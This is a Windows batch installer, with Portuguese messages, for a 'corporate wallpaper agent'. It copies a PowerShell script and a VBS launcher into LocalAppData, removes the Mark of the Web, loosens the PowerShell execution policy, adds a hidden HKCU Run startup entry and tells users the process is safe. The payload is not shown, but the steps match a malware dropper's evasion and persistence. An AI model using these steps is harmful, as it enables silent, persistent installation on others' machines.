@echo off
title Ativando o Papel de Parede Corporativo
color 0B
echo.
echo =================================================================
echo       BEM-VINDO: AGENTE DE PAPEL DE PAREDE
echo =================================================================
echo.
echo Ola! Estamos configurando o seu novo papel de parede dinamico.
echo Este processo e 100%% seguro e nao pedira senhas.
echo.

cd /d "%~dp0"

set TARGET_DIR=%LOCALAPPDATA%\CorpWallpaperSystem
set SCRIPT_NAME=WallpaperAgent.ps1
set LAUNCHER_NAME=WallpaperLauncher.vbs
set REG_KEY=HKCU\Software\Microsoft\Windows\CurrentVersion\Run
set REG_NAME=CorporateWallpaperAgent

:: 1. Verificar se os arquivos existem
if not exist "%SCRIPT_NAME%" (
    color 0C
    echo [ERRO] O arquivo %SCRIPT_NAME% nao esta na mesma pasta.
    echo Certifique-se de extrair todos os arquivos do ZIP antes de rodar!
    echo.
    pause
    exit /b
)
if not exist "%LAUNCHER_NAME%" (
    color 0C
    echo [ERRO] O arquivo %LAUNCHER_NAME% nao esta na mesma pasta.
    echo Certifique-se de extrair todos os arquivos do ZIP antes de rodar!
    echo.
    pause
    exit /b
)

:: 2. Encerrar instancia anterior se estiver rodando
echo [+] Preparando o sistema local...
powershell -Command "Get-WmiObject Win32_Process | Where-Object { $_.CommandLine -like '*WallpaperAgent*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }" >nul 2>&1
timeout /t 2 /nobreak >nul

:: 3. Criar pasta de instalacao
if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"

:: 4. Copiar o script e o launcher (com 3 tentativas)
echo [+] Instalando o agente silencioso na maquina...
set RETRIES=0

:retry_copy
copy /y "%SCRIPT_NAME%"   "%TARGET_DIR%\%SCRIPT_NAME%"   >nul 2>&1
copy /y "%LAUNCHER_NAME%" "%TARGET_DIR%\%LAUNCHER_NAME%" >nul 2>&1
if exist "%TARGET_DIR%\%SCRIPT_NAME%" goto copy_ok

set /a RETRIES+=1
if %RETRIES% GEQ 3 goto copy_fail
echo     Tentativa %RETRIES% falhou, aguardando...
timeout /t 2 /nobreak >nul
goto retry_copy

:copy_fail
color 0C
echo.
echo [ERRO] Nao foi possivel copiar o agente apos 3 tentativas.
echo Possiveis causas:
echo   - Permissao de pasta negada
echo   - Outra instancia do programa ainda travada
echo.
echo Tente fechar programas e rodar novamente.
pause
exit /b

:copy_ok

:: Remover o bloqueio "Mark of the Web" (arquivo veio de ZIP baixado da internet)
powershell -NoProfile -ExecutionPolicy Bypass -Command "Unblock-File -Path '%TARGET_DIR%\%SCRIPT_NAME%'" >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -Command "Unblock-File -Path '%TARGET_DIR%\%LAUNCHER_NAME%'" >nul 2>&1

:: Liberar execucao de scripts PS1 para o usuario atual (nao requer admin)
powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -Force" >nul 2>&1

:: 5. Copiar config.txt se existir
if exist "config.txt" (
    echo [+] Aplicando configuracoes personalizadas...
    copy /y "config.txt" "%TARGET_DIR%\config.txt" >nul 2>&1
)

:: 6. Registrar no startup via HKCU\Run (usa o VBS launcher para janela invisivel)
echo [+] Registrando rotina silenciosa de atualizacao automatica...
reg add "%REG_KEY%" /v "%REG_NAME%" /t REG_SZ /d "wscript.exe \"%TARGET_DIR%\%LAUNCHER_NAME%\"" /f >nul 2>&1

:: 7. Executar o agente pela primeira vez (janela 100%% invisivel via VBS)
echo [+] Finalizando integracoes e configuracoes...
start "" wscript.exe "%TARGET_DIR%\%LAUNCHER_NAME%"

echo.
echo =================================================================
echo.
echo TUDO PRONTO! O programa corporativo foi ativado com sucesso!
echo O seu fundo de tela mudara sozinho agorinha mesmo :)
echo.
echo Essa tela fechara sozinha em instantes... Tenha um otimo dia!
echo.
echo =================================================================
timeout /t 4 >nul
